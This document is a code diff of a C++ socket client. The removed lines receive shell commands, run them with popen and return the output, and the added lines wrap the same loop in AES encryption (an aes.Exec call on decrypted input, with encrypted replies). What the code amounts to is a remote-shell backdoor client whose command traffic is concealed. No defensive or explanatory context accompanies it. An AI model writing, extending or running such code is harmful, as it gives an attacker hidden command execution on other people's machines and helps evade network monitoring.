@@ -11,6 +11,7 @@
 #include <string>
 #include <stdio.h>
 #include <iostream>
+#include "FunCli.h"
 #define PORT 4567
 int main()
 {
@@ -53,30 +54,27 @@ int main()
         closesocket(fd);
 #endif
     }
-    const char *msg = "im from client";
-    char buff[256];
+    const char *msg = "Im from client";
     send(fd, msg, strlen(msg) + 1, 0);
-    recv(fd, buff, sizeof(buff), 0);
-    printf("%s\n", buff);
-    FILE *fp = NULL;
-    char cmd[1024];
-    char buf[1024];
-    char result[4096];
+    char buffer[1024];
+    memset(buffer, 0, 1024);
+
+    recv(fd, buffer, 1024, 0);
+    AES aes(buffer);
+    int len;
+    int error;
     while(1)
-    {
-        recv(fd, cmd, sizeof(cmd), 0);
-        if((fp = popen(cmd, "r")) != NULL)
-        {   
-            while(fgets(buf, 1024, fp) != NULL)
-            {
-                strcat(result, buf);
-            }
-            pclose(fp);
-            fp = NULL;
-        }
-        send(fd, result, sizeof(result), 0);
-        memset(result, 0, 4096);
-    }
+	{   
+        error = recv(fd, buffer, 1024, 0);
+        if(error == 0)break;
+        aes.InvCipher((void *)buffer, 8);
+        aes.Exec(buffer);
+
+        len = strlen(aes.temp);
+        aes.Cipher((void *)aes.temp);
+        send(fd, aes.temp, 1024, 0);
+	}
+    memset(buffer, 0, 1024);
 
 #ifndef __WIN32
     close(fd);
